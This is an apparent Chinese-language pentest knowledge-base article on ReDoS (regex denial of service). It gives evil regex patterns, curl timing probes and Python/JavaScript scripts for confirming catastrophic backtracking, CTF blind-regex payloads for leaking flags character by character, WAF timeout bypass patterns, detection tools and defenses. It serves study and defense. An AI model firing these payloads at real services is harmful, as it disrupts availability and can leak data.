---
attack_surface: [编码/序列化滥用, 注入类]
impact: [可用性破坏]
risk_level: 中
prerequisites:
  - 正则表达式基础
  - 回溯原理理解
  - NFA/DFA 引擎差异认知
difficulty: 中级
related_techniques:
  - sql-injection
  - nosql-injection
  - orm-injection
  - xss-cross-site-scripting
tools:
  - regexploit
  - rxxr
  - Burp Suite
  - curl
---

# ReDoS — 正则表达式拒绝服务攻击

> 关联文档：[SQL Injection](../SQL%20Injection/README.md) · [NoSQL Injection](../NoSQL%20Injection/README.md) · [ORM Injection](../ORM%20Injection/README.md) · [XSS](../../Reflected%20Values/XSS/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 ReDoS

ReDoS（Regular Expression Denial of Service）利用**回溯型正则引擎（Backtracking Engine）**在匹配特定输入时的**指数级时间复杂度**，通过传入精心构造的字符串使 CPU 长时间卡死在正则匹配中，造成拒绝服务。

## 1.2 为什么会发生

**根因**：PCRE（Perl Compatible Regular Expressions）、Java `java.util.regex`、Python `re`、JavaScript 等语言的默认正则引擎使用**回溯算法（Backtracking）**。当正则中包含**量词嵌套**或**多路径选择**时，引擎在匹配失败前会穷举所有可能的分组组合，路径数随输入长度呈指数增长。

```
正则: (a+)+b
输入: aaaaaaaaaaaaaaaaaa  (不含 'b')

回溯路径:
  (a)(a)...(a) → 最后字符不是 'b' → 失败
  (aa)(a)...(a) → 最后字符不是 'b' → 失败
  (aaa)(a)...(a) → 最后字符不是 'b' → 失败
  ... → 组合数 = O(2^n)，n=20 时 ≈ 1,000,000+ 次回溯
```

**正则引擎对比**：

| 引擎 | 算法 | 是否回溯 | ReDoS 风险 |
|------|------|---------|-----------|
| **PCRE** (PHP/Perl) | 回溯 | 是 | **高** |
| **java.util.regex** | 回溯 | 是 | **高** |
| **Python `re`** | 回溯 | 是 | **高** |
| **JavaScript RegExp** | 回溯 | 是 | **高** (V8 有限) |
| **RE2** (Google) | NFA/DFA | 否（无回溯） | 无 |
| **RE2J** (Java) | NFA/DFA | 否（无回溯） | 无 |
| **Rust `regex`** | NFA/DFA | 否（无回溯） | 无 |

## 1.3 经典 Evil Regex 模式

```regex
# 模式 1: 量词嵌套
(a+)+              # 重复组的重复
([a-zA-Z]+)*       # 字符类的量词 + 外部再次量词
(a|aa)+            # 包含重叠选择的量词
(\w+)+             # 最危险的通用模式之一
(a+)+b             # 必须以特定字符 'b' 结尾 — 攻击者不提供 'b'

# 模式 2: 多路径选择
(a|b|ab)*c         # 引擎在 a/b/ab 之间尝试所有组合

# 模式 3: 可选 + 量词组合
(a?)+a             # 输入 n 个 'a'→ O(2^n)
```

---

# 0x02 攻击步骤

## 2.1 识别攻击面

任何接受用户输入并应用正则匹配的端点都可能存在 ReDoS 风险：

- **搜索功能** — 正则过滤/验证用户搜索词
- **WAF/IPS** — 恶意载荷检测（正则本身可能被攻击）
- **表单验证** — 邮箱、电话格式校验
- **路由匹配** — 自定义 URL 路由
- **日志解析** — 日志模式匹配
- **API 参数校验** — 入参格式验证

## 2.2 时间差确认

```bash
# 正常输入 → 快速响应 (< 100ms)
curl -w "%{time_total}s\n" -o /dev/null "https://target/search?q=hello"

# Evil 输入 → 慢速响应 (> 5s)
curl -w "%{time_total}s\n" -o /dev/null "https://target/search?q=aaaaaaaaaaaaaaaaaaaaaa"
```

## 2.3 Python 检测脚本

```python
import time, requests

def test_redos(url, param):
    """逐步增加输入长度，检测响应时间增长模式"""
    for n in [5, 10, 15, 20, 25, 30]:
        payload = "a" * n
        start = time.time()
        r = requests.get(url, params={param: payload})
        elapsed = time.time() - start
        print(f"  n={n}: {elapsed:.3f}s (status={r.status_code})")
        if elapsed > 5:  # 超过 5 秒 → 很可能 ReDoS
            print(f"  [!!] Likely ReDoS at n={n}")

# 测试多个已知 evil 模式
payloads = [
    lambda n: "a" * n,                    # (a+)+ 触发器
    lambda n: "a" * n + "!",              # (a+)+b 模式 (+ 不含 'b')
    lambda n: "\\x00" * n,               # 空字节触发某些引擎死循环
]
```

## 2.4 PoC 构造方法

大多数灾难性回溯遵循统一构造公式：

1. **前缀（可选）**：将引擎引入脆弱子模式
2. **长量词串**：大量重复字符在嵌套/重叠量词间产生歧义匹配（如多个 `a`、`_`、空格）
3. **失败尾字符**：不匹配最后一个 token 的字符（如 `!`）→ 强制引擎回溯所有可能性

**最小 PoC 示例**：

```bash
# (a+)+$ vs "a"*N + "!"
# \w*_*\w*$ vs "v" + "_"*N + "!"
```

**Python 计时验证框架**：

```python
import re, time

# 测试用 evil 正则
pat = re.compile(r'(\w*_)\w*$')

for n in [2**k for k in range(8, 15)]:
    s = 'v' + '_'*n + '!'
    t0 = time.time()
    pat.search(s)
    dt = time.time() - t0
    print(n, f"{dt:.3f}s")
    # 观察指数级增长：256→512→1024→... 时时间应超线性增长
```

**构造思路**：逐步倍增 `N`，观察响应时间——若呈超线性（指数/高次多项式）增长，即确认为 EvIL ReDoS。

---

# 0x03 高级利用

## 3.1 ReDoS → 数据泄露

在某些 CTF 场景中，ReDoS 的**回溯路径数差异**可以作为侧信道泄露数据：

```python
# 原理: 正则匹配耗时与匹配成功的回溯路径数相关
# 条件: 应用使用用户输入的正则 + 已知字符串

import time
def leak_char(pattern_prefix, target_string):
    """通过 ReDoS 时间差逐个字符泄露目标字符串"""
    for ch in "abcdefghijklmnopqrstuvwxyz0123456789":
        regex = f"^{pattern_prefix}{ch}.*"  # 用户可控的正则
        start = time.time()
        re.match(regex, target_string)
        elapsed = time.time() - start
        if elapsed > threshold:  # 回溯时间长 → 可能是正确前缀
            return ch
```

> 此技术的实用性有限，但 CTF 中偶有出现。

### CTF 实战 Payload 模式

三种经过 CTF 验证的盲注正则模式：

```python
# 模式 1: PortSwigger 盲注 — ^(?=<flag>)((.*)*)*salt$
# 原理：正向先行断言检查前缀，若匹配则触发灾难性回溯
regex = r"^(?=HTB{sOmE_fl§N§)((.*)*)*salt$"

# 模式 2: TacoMaker @ DEKRA CTF 2022 — <flag>(((((((.*)*)*)*)*)*)*)!
# 原理：多重量词嵌套，匹配正确前缀后触发指数级回溯
regex = f"<flag_prefix>(((((((.*)*)*)*)*)*)*)!"

# 模式 3: CTFtime 通用盲注 — ^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$
# 原理：.* 重复 7 次 + 末尾 !!!!，匹配时产生可观测的时间差
regex = f"^(?=${{flag_prefix}}).*.*.*.*.*.*.*.*!!!!$"
```

**关键逻辑**：若正则前缀与实际 flag 前缀匹配 → 引擎进入回溯层 → 响应时间显著增加（超时/高延迟）。若不匹配 → 引擎快速放弃 → 响应快。时间差即为逐字符泄露的 Oracle。

## 3.2 绕过反 ReDoS 保护

某些云 WAF 对正则匹配设置全局超时（如 2s）。绕过思路：

```regex
# 使用不常见的 evil 模式（绕过已知 evil 模式黑名单）
(\w{1,4})*\w{1,4}         # 替代 (\w+)*
([a-z]*)+\p{P}            # Unicode 属性类 → 某些引擎处理更慢
```

## 3.3 同时控制输入和正则（全控场景）

当攻击者**同时控制正则表达式和输入字符串**时，ReDoS 利用极其简单——任意 evil 模式均可直接注入：

```javascript
function check_time_regexp(regexp, text) {
  var t0 = new Date().getTime()
  new RegExp(regexp).test(text)
  var t1 = new Date().getTime()
  console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// 以下所有 payload 对同一输入 "aaaaaaaaaaaaaaaaaaaaaaaaaa!" 均触发灾难性回溯
;[
  "(a|a?)+$",
  "(\\w*)+$",
  "(a*)+$",
  "(.*a){100}$",
  "([a-zA-Z]+)*$",
  "(a+)*$",
].forEach((regexp) => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```

**适用场景**：
- 允许用户自定义过滤规则（如邮箱过滤、日志搜索）的系统
- 可存储正则表达式的规则引擎
- WAF/IDS 中用户可配置的自定义检测规则

---

# 0x04 语言/引擎注意事项（攻击者视角）

| 语言 | 默认引擎 | 最大回溯限制 | 备注 |
|------|---------|------------|------|
| **PHP** | PCRE | 默认 1,000,000 | `pcre.backtrack_limit` 可限制 |
| **Python** | `re` (回溯) | 无默认限制 | `regex` 库支持超时参数 |
| **Java** | `java.util.regex` | 无默认限制 | 线程级别可中断 |
| **JavaScript (Node.js)** | V8 Irregexp | 无固定限制 | 受 event loop 单线程影响更大 |
| **Go** | RE2 (无回溯) | N/A | **默认免疫 ReDoS** |
| **Rust** | `regex` crate | N/A | **默认免疫 ReDoS** |

## 4.1 攻击者视角速查

不同控制权限下的利用策略：

| 控制权限 | 利用策略 | 典型目标 |
|---------|---------|---------|
| **仅控制输入** | 寻找使用复杂验证器的端点；若发现 `(\\w+)+` 类模式 → 尝试长量词输入 | 邮箱/电话格式校验、搜索过滤 |
| **控制正则 + 输入**（存储型规则） | ReDoS 极其简单 → 直接注入 evil 模式 | 用户自定义过滤规则、规则引擎 |
| **仅控制正则**（盲注） | 利用 `^(?=<prefix>)((.*)*)*salt$` 侧信道逐字符泄露 | CTF / 盲注 ReDoS 场景 |

**关键经验**：
- JavaScript（浏览器/Node）：内建 `RegExp` 为回溯引擎，当正则和输入均可受攻击者影响时极易利用
- Python：`re` 为回溯引擎；长歧义量词串 + 失败尾字符 → 高度可靠的灾难性回溯
- Java：`java.util.regex` 为回溯引擎；仅控制输入时关注使用复杂验证器的端点；控制正则时（如存储规则）利用极为简单
- **RE2 / RE2J / RE2JS / Rust `regex`**：设计上无回溯，消除 ReDoS 原语——若遇到这些引擎，转向其他瓶颈（如超大模式长度）或寻找仍使用回溯引擎的组件

---

# 0x05 工具与自动化检测

## 5.1 regexploit

自动发现 evil 正则并生成利用输入：

```bash
pip install regexploit
regexploit                        # 交互式分析单个模式
regexploit-py path/to/code/       # 扫描 Python 代码中的正则
regexploit-js path/to/code/       # 扫描 JavaScript 代码中的正则
```

## 5.2 vuln-regex-detector

端到端管道：从项目中提取正则 → 检测脆弱模式 → 在目标语言中验证 PoC。适用于大规模代码库审计。

```bash
# https://github.com/davisjam/vuln-regex-detector
```

## 5.3 redos-detector

CLI / JS 库，通过回溯推理判断正则是否安全：

```bash
# https://github.com/tjenkinson/redos-detector
```

## 5.4 在线工具

- [devina.io/redos-checker](https://devina.io/redos-checker) — 在线 ReDoS 检测器

> **实战提示**：仅控制输入时，生成倍增长度（如 2^k 字符）的字符串并追踪延迟——指数级增长强指示 ReDoS。

---

# 0x06 防御策略

1. **使用非回溯引擎**：Go (`regexp`)、Rust (`regex` crate)、RE2 库

2. **设置正则匹配超时**：
   ```python
   # Python 使用 regex 包（非 re）
   import regex
   regex.match(r'(a+)+b', input, timeout=1.0)  # 1s 超时
   ```
   ```java
   // Java 使用 Matcher 的线程中断
   ExecutorService executor = Executors.newSingleThreadExecutor();
   Future<Boolean> future = executor.submit(() -> pattern.matcher(input).matches());
   future.get(1, TimeUnit.SECONDS);
   ```

3. **代码审查重点**：
   - 禁止 `(A+)+` 模式（量词嵌套）
   - 禁止 `(A*)*`（空字符串循环）
   - 禁止 `(A|B)*` + 重叠模式

4. **CI 阶段检测**：使用 `regexploit`、`rxxr` 等工具扫描代码中的 evil 正则

5. **输入长度限制** — 对正则匹配输入设置合理上限（如 < 256 字符）

---

# 0x07 参考资料

- [OWASP — Regular Expression Denial of Service](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
- [PortSwigger — Blind Regex Injection: Theoretical Exploit Offers New Way to Force Web Apps to Spill Secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
- [GitHub — jorgectf/TacoMaker CTF Challenge (ReDoS Blind Solver)](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20@%20DEKRA%20CTF%202022/solver/solver.html)
- [CTFtime — ReDoS Blind Writeup](https://ctftime.org/writeup/25869)
- [Regexploit — Evil Regex Scanner](https://github.com/doyensec/regexploit)
- [vuln-regex-detector — End-to-end ReDoS Detection Pipeline](https://github.com/davisjam/vuln-regex-detector)
- [redos-detector — CLI/JS Backtracking Analyzer](https://github.com/tjenkinson/redos-detector)
- [devina.io — Online ReDoS Checker](https://devina.io/redos-checker)
- [rxxr — ReDoS Checker](https://github.com/nickengmann/rxxr)
- [SoK (2024) — A Literature and Engineering Review of ReDoS](https://arxiv.org/abs/2406.11618)
- [Google RE2 — Why RE2 (Linear-Time Regex Engine)](https://github.com/google/re2/wiki/WhyRE2)
- [HackTricks — ReDoS](https://book.hacktricks.xyz/pentesting-web/regular-expression-denial-of-service-redos)
- [Cloudflare — ReDoS Prevention](https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/)
